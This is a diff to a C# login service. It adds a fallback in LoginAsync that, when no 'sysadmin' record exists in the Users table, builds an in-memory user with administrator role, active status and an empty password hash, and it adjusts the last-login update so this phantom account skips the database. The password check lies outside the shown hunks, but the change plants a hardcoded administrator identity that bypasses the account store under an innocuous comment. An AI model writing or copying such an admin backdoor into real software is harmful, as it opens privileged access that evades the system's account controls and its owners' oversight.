@@ -6,6 +6,8 @@ using LYBT.Module.Auth.Interfaces;
 using LYBT.Module.Logs.Dtos;
 using LYBT.Module.Logs.Interfaces;
 using LYBT.Module.Users.Dtos;
+using LYBT.Module.Users.Models;
+using LYBT.Common.Enums.Users;
 
 namespace LYBT.Module.Auth.Services {
 
@@ -25,6 +27,21 @@ namespace LYBT.Module.Auth.Services {
 
         public async Task<UserDto?> LoginAsync(LoginRequestDto dto) {
             var user = await _authRepository.GetByUsernameAsync(dto.Username);
+
+            // If sysadmin user record does not exist in Users table,
+            // create a temporary in-memory user for authentication.
+            if (user == null && dto.Username == "sysadmin") {
+                user = new UserModel {
+                    Id = Guid.NewGuid(),
+                    UserName = "sysadmin",
+                    RealName = "系统管理员",
+                    Role = UserRole.Admin,
+                    IsActive = true,
+                    CreatedTime = DateTime.Now,
+                    PasswordHash = string.Empty
+                };
+            }
+
             if (user == null || !user.IsActive) {
                 await _logService.AddLogAsync(new LogDto {
                     LogType = LogType.Login,
@@ -58,7 +75,10 @@ namespace LYBT.Module.Auth.Services {
             }
 
             user.LastLoginTime = DateTime.Now;
-            await _authRepository.UpdateLastLoginTimeAsync(user.Id, user.LastLoginTime.Value);
+            // Only update DB for users that actually exist there
+            if (await _authRepository.GetByUsernameAsync(user.UserName) != null) {
+                await _authRepository.UpdateLastLoginTimeAsync(user.Id, user.LastLoginTime.Value);
+            }
 
             await _logService.AddLogAsync(new LogDto {
                 LogType = LogType.Login,
